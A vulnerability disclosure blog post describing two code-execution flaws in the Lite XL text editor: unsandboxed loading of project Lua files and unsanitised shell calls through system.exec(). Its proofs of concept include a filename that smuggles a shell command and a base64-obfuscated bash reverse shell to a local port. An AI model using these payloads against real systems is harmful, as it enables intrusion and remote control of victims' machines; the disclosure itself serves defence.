---
layout: post
title: "Lite XL — Arbitrary Code & Remote Code Execution (CVE-2025-12120 & CVE-2025-12121)"
date: 2025-10-31
categories: [vulnerabilities]
permalink: /vulnerabilities/lite-xl-rce/
---

Lite XL is a lightweight, cross-platform text editor written in Lua and C. It supports plugins and Lua-based customization. If you want to check the project, see https://github.com/lite-xl/. In this short post I’ll describe two security issues I found in versions 2.1.8 and earlier. These vulnerabilities come from the application executing project-level Lua modules (e.g. .lite_project.lua) and the user configuration file (init.lua) directly with no restrictions. Also, the system.exec function is able to run shell commands in an unsafe way, which is a second attack vector and leads to Remote Code Execution. As a result, a manipulated project directory opened by Lite XL — or a specially crafted file the user opens — can cause commands to run on the target system. Yes, these are not trivially triggered and a user could notice them, but they are still real issues.

## Vulnerability descriptions and PoCs

There are two separate mechanisms behind the issues:

#### CVE-2025-12120 — **Arbitrary Code Execution** 
When Lite XL opens a project directory it automatically executes the .lite_project.lua file in that directory. Although this file is meant for project configuration, it can contain arbitrary Lua code. In short, an attacker who places malicious Lua code in .lite_project.lua can get that code executed when the project is opened (or when the file is saved). The root cause is that the editor loads these Lua files with dofile() without any sandboxing or validation. Because of that, all system-level Lua facilities (os.execute, io.popen, etc.) become available with full privileges.

**PoC:**

```
os.execute("touch /tmp/hello.txt")
```

Put this into .lite_project.lua and save it; you should see /tmp/hello.txt created. This issue is similar for the user config file ~/.config/lite-xl/init.lua. Additionally, Lite XL’s “Core: Open User Module” command opens the init.lua file, making it easy to place code there.

#### CVE-2025-12121 — **Insecure system.exec() Function**
Several components (e.g. core.lua, rootview.lua, treeview.lua) use a system.exec() function that forwards input to the shell without sanitization. If filenames or other user inputs include shell meta-characters, they get executed. This can be triggered by actions such as:

- Drag and Drop
- Open In System
- Open Project Folder

They are different code paths, but all rely on system.exec() passing user input straight to the shell.

**PoC:**

Create a file named $(touch hello.txt) and open it in Lite XL — you should see hello.txt created. If you push this further you could get a reverse shell by using a filename that decodes and runs a payload; for example:

```
$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx | base64 -d | bash)
```

That base64 decodes to `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`

## References

- CERT/CC Vulnerability Note VU#579478
- https://github.com/lite-xl/lite-xl/
- https://github.com/lite-xl/lite-xl/pull/1472
- https://github.com/lite-xl/lite-xl/pull/1473
- https://www.cve.org/CVERecord?id=CVE-2025-12120
- https://www.cve.org/CVERecord?id=CVE-2025-12121

